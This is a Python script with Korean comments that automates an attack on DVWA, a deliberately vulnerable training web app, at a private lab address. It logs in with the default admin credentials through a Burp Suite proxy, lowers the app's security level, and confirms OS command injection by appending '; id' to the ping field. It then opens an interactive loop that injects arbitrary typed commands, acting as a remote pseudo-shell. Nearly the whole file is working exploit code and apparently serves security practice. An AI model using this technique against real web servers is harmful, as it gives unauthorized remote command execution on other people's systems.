import sys
import re
import requests
from bs4 import BeautifulSoup

# (1) 로그인 시도

login_url = 'http://192.168.10.134/dvwa/login.php'  # dvwa 사이트 로그인 페이지 주소 (dvwa 들어있는 서버 IP 주소)
login_data = {'username' : 'admin' , 'password' : 'password' , 'Login' : 'Login'}
OK_MSG = 'Welcome to Damn Vulnerable Web App!' # 로그인 성공했을 때 뜨는 페이지의 문구 중 하나 (성공 여부 파악 위해)
proxies = {'http' : 'http://localhost:9000' , 'https' : 'http://localhost:9000'} # 프록시 속성 설정

# 현재 Burp Suite 툴에 프록시를 잡아놨기 때문에 프록시 속성 설정을 해줌 (9000번은 Burp Suite 프록시 포트) 임의로 설정 가능
# Burp Suite 프록시를 잡은 이유는 웹 request , response , data 분석하기 위해서

s = requests.session()  # 세션을 고정하는 구문 ( 로그인 시도 후 계속 다른 작업을 해야되기 때문에 )
                        # 이 값을 해주지 않으면 requests 요청시 마다 새로운 세션이 열림
resp = s.post(login_url , data=login_data , proxies=proxies) # 위에 지정해준 url , data , proxies 값 넣어줌

soup = BeautifulSoup(resp.text , 'lxml')  # BeautifulSoup 모듈을 이용해서 웹페이지 가공해서 원하는 값만 출력시킬 수 있음
contents = soup.h1.string                 # 아까 성공 여부 문구가 들어있는 태그(h1)을 contents에 담음

if re.search(OK_MSG , contents):   # 두 문구가 일치하는지 여부를 판단하는 조건문
    print("[+] Login Successful")
else:
    sys.exit("[-] Login Failed")   # 로그인 실패시 프로그램 종료



# (2) dvwa 보안 레벨 low로 낮추기

security_url = 'http://192.168.10.134/dvwa/security.php'                # dvwa 보안 레벨 설정 페이지
security_data = {'security' : 'low' , 'seclev_submit' : 'Submit'}       # 보안레벨 설정 Post data 값
OK_MSG2 = 'Security level set to low'                                   # low 설정 성공 시 뜨는 문구

resp2 = s.post(security_url , data=security_data , proxies=proxies)
soup2 = BeautifulSoup(resp2.text , 'lxml')
sec_contents = soup2.find('div' , class_='message').string      # 성공 여부 문구가 들어있는 곳 찾아서 담음

if re.search(OK_MSG2 , sec_contents):
    print("[+] Security Level set to low")
else:
    sys.exit("[-] Set to low Failed")


# (3) DVWA Command Execution 공격이 가능한지 여부 판단

cmdi_url = 'http://192.168.10.134/dvwa/vulnerabilities/exec/'    # Command Execution Test URL
cmd = 'id'                                                       # Test할 명령어
cmdi_data = {'ip' : '127.0.0.1; '+cmd , 'submit' : 'submit'}
OK_MSG3 = 'uid='                                                 # 성공 여부 판단 문구

resp3 = s.post(cmdi_url , data=cmdi_data , proxies=proxies)
soup3 = BeautifulSoup(resp3.text , 'lxml')

cmd_content = soup3.pre.string

if re.search(OK_MSG3 ,cmd_content):
    print("[+] Command Execution Attack Possible")
else:
    sys.exit("[-] Command Execution Attack impossible")


# (4) DVWA Command Execution 공격
while True:
    CMD = input('Enter your Command (QUIT:q) :')   # 반복적으로 명령어 수행가능하도록 (쉘처럼)
    if CMD == 'q':
        break
    cmdi_data = {'ip': '127.0.0.1; ' + CMD, 'submit': 'submit'}
    resp = s.post(cmdi_url , data=cmdi_data , proxies=proxies)
    soup4 = BeautifulSoup(resp.text , 'lxml')
    result = soup4.pre.get_text()              # get_text() - 타입이 문자열 / .string은 타입이 <class 'bs4.element.NavigableString'>
    print(result[368:])                        # ping 부분은 출력 결과에서 빼고 출력


''' ping 부분을 빼는 다른 방법 ( 운영체제 명령어 사용 )
with open('cmdoutput.txt' , 'w') as fd:
    fd.write(soup.pre.string)

os.system('cat cmdoutput.txt | egrep -v "(PING|64 bytes|ping statistics|packets transmitted|rtt min)"
'''